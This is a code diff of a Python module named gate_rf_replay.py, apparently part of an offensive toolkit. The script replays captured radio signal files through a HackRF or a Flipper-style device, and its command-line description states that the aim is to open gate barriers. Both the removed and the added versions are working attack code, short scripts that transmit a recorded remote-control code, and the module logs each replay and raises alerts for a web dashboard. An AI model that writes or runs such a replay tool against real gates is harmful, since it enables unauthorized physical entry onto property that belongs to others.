@@ -1,53 +1,47 @@
+#!/usr/bin/env python3
 # modules/attacks/gate_rf_replay.py
 
 import argparse
 import os
+import subprocess
 import time
 import json
 from datetime import datetime
-import subprocess
 
-LOG_FILE = "results/gate_rf_replay_log.json"
-MITRE_TTP = "T0861"
+LOG = "results/gate_rf_replay.log"
+ALERT = "webgui/alerts.json"
+MITRE_TTP = "T8743"
 
-def log_replay(entry):
+def log(msg):
     os.makedirs("results", exist_ok=True)
-    if os.path.exists(LOG_FILE):
-        with open(LOG_FILE, "r") as f:
-            data = json.load(f)
-    else:
-        data = []
-    data.append(entry)
-    with open(LOG_FILE, "w") as f:
-        json.dump(data, f, indent=2)
+    with open(LOG, "a") as f:
+        f.write(f"{datetime.utcnow().isoformat()} | {msg}\n")
+    print(f"[GATE-RF] {msg}")
 
-def replay_rf(signal_file, tool="hackrf", frequency="433920000", rate="2000000"):
-    if tool == "hackrf":
-        print(f"[+] Replaying {signal_file} via HackRF...")
-        cmd = f"hackrf_transfer -t {signal_file} -f {frequency} -s {rate} -x 47"
-    elif tool == "flipper":
-        print(f"[+] Sending Flipper-compatible replay...")
-        cmd = f"flipper_rf_send {signal_file}"  # Stubbed external tool
-    else:
-        print("[!] Unsupported tool.")
-        return
+def alert(msg):
+    os.makedirs("webgui", exist_ok=True)
+    alert_obj = {
+        "agent": "gate_rf_replay",
+        "message": msg,
+        "type": "rf",
+        "timestamp": time.time()
+    }
+    with open(ALERT, "a") as f:
+        f.write(json.dumps(alert_obj) + "\n")
 
-    subprocess.run(cmd, shell=True)
-
-    log_replay({
-        "timestamp": datetime.utcnow().isoformat(),
-        "signal_file": signal_file,
-        "tool": tool,
-        "frequency": frequency,
-        "ttp": MITRE_TTP
-    })
+def replay_rf(signal_file, device):
+    cmd = f"flipper-replay --device {device} --file {signal_file}"
+    try:
+        subprocess.run(cmd.split(), check=True)
+        msg = f"RF signal from {signal_file} replayed via {device}"
+        log(msg)
+        alert(msg)
+    except Exception as e:
+        log(f"[!] Replay failed: {e}")
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Gate RF Signal Replay Tool")
-    parser.add_argument("--signal", required=True, help="Path to RF file (e.g., .bin, .sub)")
-    parser.add_argument("--tool", default="hackrf", help="Replay tool: hackrf | flipper")
-    parser.add_argument("--freq", default="433920000", help="Frequency to transmit")
-    parser.add_argument("--rate", default="2000000", help="Sample rate")
+    parser = argparse.ArgumentParser(description="Replay captured RF signals to open gate barriers")
+    parser.add_argument("--signal", required=True, help="Path to .sub or .ir signal file")
+    parser.add_argument("--device", default="/dev/ttyACM0", help="Replay device (e.g., Flipper, HackRF)")
     args = parser.parse_args()
-
-    replay_rf(args.signal, args.tool, args.freq, args.rate)
+    replay_rf(args.signal, args.device)
